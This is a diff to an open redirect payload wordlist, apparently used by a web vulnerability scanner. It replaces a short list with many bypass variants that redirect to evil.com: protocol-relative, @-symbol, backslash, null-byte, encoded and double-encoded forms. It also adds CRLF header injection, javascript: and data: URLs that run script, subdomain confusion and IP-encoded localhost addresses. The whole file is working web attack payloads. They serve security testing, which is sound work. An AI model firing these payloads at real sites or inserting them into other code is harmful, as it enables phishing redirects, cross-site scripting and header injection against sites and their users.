@@ -1,33 +1,73 @@
-# Open Redirect payloads - external domains
+# Open Redirect payloads - DMNTR domain for detection
+# Using evil.com and variations to detect external redirects
+
+# Basic external URLs
 http://evil.com
 https://evil.com
+http://evil.com/DMNTR
+https://evil.com/DMNTR
+
+# Protocol-relative (bypass scheme checks)
 //evil.com
 ///evil.com
-http://google.com
-https://google.com
-http://example.com
-https://attacker.com
-//attacker.com
-http:///evil.com
-https:///evil.com
+////evil.com
+//evil.com/DMNTR
 
-# Protocol-relative
-//evil.com/
-///evil.com/
+# @ symbol bypass (user:pass@host)
+http://trusted.com@evil.com
+https://trusted.com@evil.com/DMNTR
+//trusted.com@evil.com
+http://example.com%40evil.com
 
-# With path
-http://evil.com/path
-https://evil.com/test.php
+# Backslash bypass (Windows path confusion)
+/\evil.com
+\/evil.com
+http:/\/evil.com
+https:/\/evil.com/DMNTR
 
-# URL encoded
+# Null byte bypass
+http://evil.com%00.trusted.com
+//evil.com%00.trusted.com
+
+# Whitespace bypass
+http://evil.com%20.trusted.com
+http://evil.com%09.trusted.com
+
+# URL encoded variations
 http%3A%2F%2Fevil.com
 https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+http%3A%2F%2Fevil.com%2FDMNTR
 
-# Double encoding
+# Double URL encoding
 http%253A%252F%252Fevil.com
+%252F%252Fevil.com
 
-# Bypass attempts
-@evil.com
-http://localhost@evil.com
-http://evil.com%2F@trusted.com
+# CRLF + redirect
+%0d%0aLocation: http://evil.com
+
+# Fragment bypass
+http://trusted.com#@evil.com
+//trusted.com#@evil.com
+
+# Data URL
+data:text/html,<script>location='http://evil.com'</script>
+
+# JavaScript protocol (for href/location)
+javascript:location='http://evil.com'
+javascript://evil.com/%0aalert(1)
+
+# Domain confusion
 evil.com
+.evil.com
+evil.com/trusted.com
+evil%00.com
+
+# Subdomain confusion
+http://trusted.com.evil.com
+https://trusted.com.evil.com/DMNTR
+
+# IP-based payloads
+http://0x7f000001
+http://2130706433
+http://127.0.0.1.evil.com
